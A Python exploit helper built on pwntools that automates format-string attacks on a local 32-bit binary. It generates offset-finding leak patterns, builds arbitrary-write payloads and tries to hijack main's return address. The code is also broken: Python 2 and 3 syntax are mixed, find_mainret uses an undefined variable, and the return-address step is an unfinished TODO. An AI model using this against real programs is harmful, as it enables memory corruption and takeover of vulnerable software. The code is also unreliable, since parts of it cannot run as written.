#!/usr/bin/env python3
import sys
import struct
import time
import os
from pwn import process, p32
import tempfile

from architectures import local_arch, x86_32
from payloads import *


def make_pattern(buffer_size, start_offset=1):
    '''
    Generate a pattern to get the offset of your buffer

    Args:
        buffer_size (int): The maximum size of your buffer
        start_offset (int): The starting offset

    Returns:
        A pattern for the format string
    '''
    pattern = 'AAAABBBB'
    offset = start_offset

    while True:
        fmt = '|%%%d$p' % offset
        if len(pattern) + len(fmt) > buffer_size:
            break

        pattern += fmt
        offset += 1

    return pattern


def compute_offset(buffer, start_offset=1, arch=x86_32):
    '''
    Compute the offset of your buffer given the result of make_pattern

    Args:
        buffer (string): The result of make_pattern
        start_offset (int): The starting offset
        arch (Architecture): The architecture of your system

    Returns:
        False if the offset is not found
        Otherwise, returns the couple (offset, padding)
    '''
    arch = arch

    buffer = buffer.replace('(nil)', '0x0')


    if 'AAAABBBB' in buffer:
        memory = buffer[buffer.index('AAAABBBB') : ]


    memory = memory.split('|')
    if memory[0] == 'AAAABBBB':
        memory = memory[1:]

    
    memory = map(lambda x: struct.pack(arch.address_fmt, int(x, 16)),
                 memory[ : -1])
    memory = b''.join(memory)

    for i in range(len(buffer)):
        if memory[i:i + 10] == b'AAAABBBB|%':
            if i % arch.bytes == 0:
                return (start_offset + i // arch.bytes, 0)
            else:
                return (start_offset + i // arch.bytes + 1,
                        arch.bytes - i % arch.bytes)

    return False # not found

# find main ret and replace with write* fucntions when read memory with a "[Result]:" format
def find_mainret(binary):
    # ff 54 24 60 call main
    lname = "/tmp/mainret-".format(os.path.basename(binary))
    cmd = "objdump -d {} | grep 'ff 54 24 60' > {}".format(binary, lname )
    os.system(cmd)
    try:
        if output:
            mainret = int(output.strip().split(':')[0], 16) + 4
            print("main ret:", hex(mainret))
    except:
        return False
   

def get_offset(binary):
    p = process(binary)
    p.send(make_pattern(1024))
    time.sleep(1)
    recvdata = p.recv()
    print recvdata
    (offset, offset2) = compute_offset(recvdata)
    if offset2:
        return False
    return offset


# not useful now
def read_addr(binary, addr):

    import functions
    f  = functions.functions()
    write_function = f.functions['write', None]
    if not write_function:
        write_function = f.functions['puts', None]
    if not write_function:
        write_function = f.functions['printf', None]
   

    if not write_function:
        #return False
        write_function = 0x080483B0

    offset = get_offset(binary)
    if not offset:
        return False

    settings = PayloadSettings(offset=offset, arch=x86_32)
    wp = WritePayload()

    count = 0
    fmtpayload = ""
    pad = ""
    while count < 100:
        try:
            pad = b' ' * count  + b'[Result]:'
            start_buffer_addr = addr - len(pad)
            
            wp[start_buffer_addr] = pad
            #wp[addr] = struct.pack('@I', 0x41424344)
            fmtpayload = wp.generate(settings)
            open('ans','wb').write(fmtpayload)
            print hex(start_buffer_addr), repr(pad)
            print repr(fmtpayload)
            #raw_input("continue")
            #p.send(fmtpayload)
            break
        except:
            count += 1


    # write to ret of main with write function
    if fmtpayload:
        eippayload = p32(write_function) + p32(start_buffer_addr) + p32(len(pad) + 4)

        main_addr = find_mainret(binary)
        if not main_addr:
            #return False
            main_addr = 0x0804A040

        print "main addr:", hex(main_addr)
        # find an eip offset > main
        offset = 0
        while offset < 1024:
            p = process(binary)
            tp = make_pattern(14, offset)
            
            p.send(tp)
            time.sleep(0.1)
            recvdata = p.recv()
            
            paddr = '|0x80'
            if paddr in recvdata:
                print tp
                print recvdata
                try:
                    addr = recvdata[recvdata.index(paddr) + 1 : recvdata.index(paddr) + len(paddr) + 5]

                    if int(addr, 16) == 0x0804A040:
                        print "offset", offset
                        break
                except:
                    pass

            offset += 1

        # write payload to main_ret according offset, need stack
        if offset:
            pass
            #TODO



def write_addr_content(binary, addr, content):

    fmtpayload = ""
    offset = get_offset(binary)
    if not offset:
        return False
        
    settings = PayloadSettings(offset=offset, arch=x86_32)
    wp = WritePayload()
   
    #wp[addr] = struct.pack('@I', 0x41424344)
    wp[addr] = struct.pack('@I', content)
    fmtpayload = wp.generate(settings)
    print ("payload", repr(fmtpayload))
    return fmtpayload


def test():

    binary = sys.argv[1]
    #read_addr(binary, 0x0804A040)
    write_addr_content(binary, 0x0804A040, 0x41424344)

if __name__ == '__main__':
    test()


